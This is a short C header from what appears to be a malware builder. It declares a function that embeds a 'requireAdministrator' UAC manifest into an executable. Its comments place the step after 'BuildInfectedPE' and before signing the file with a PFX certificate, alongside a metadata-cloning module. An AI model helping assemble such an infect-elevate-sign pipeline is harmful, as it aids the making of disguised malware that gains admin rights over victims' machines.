/*
 * UacManifest.h – UAC elevation manifest embedding
 *
 * Companion to UacManifest.cpp.  Public surface mirrors PeSigning.h / CloneMeta.h style.
 */
#pragma once
#include <Windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Embed a requestedExecutionLevel="requireAdministrator" manifest (RT_MANIFEST, ID 1)
 * into the already-built targetPath.  Must be called after BuildInfectedPE (Phase 10)
 * and before SignPeWithPfx (Phase 12) — signing recalculates the checksum; any resource
 * edit after signing would invalidate the signature.
 *
 * Returns 0 on success.  Error codes:
 *   101  BeginUpdateResourceA failed on target
 *   102  UpdateResourceA failed
 *   103  EndUpdateResource failed */
int EmbedUacManifest(const char* targetPath);

#ifdef __cplusplus
}
#endif
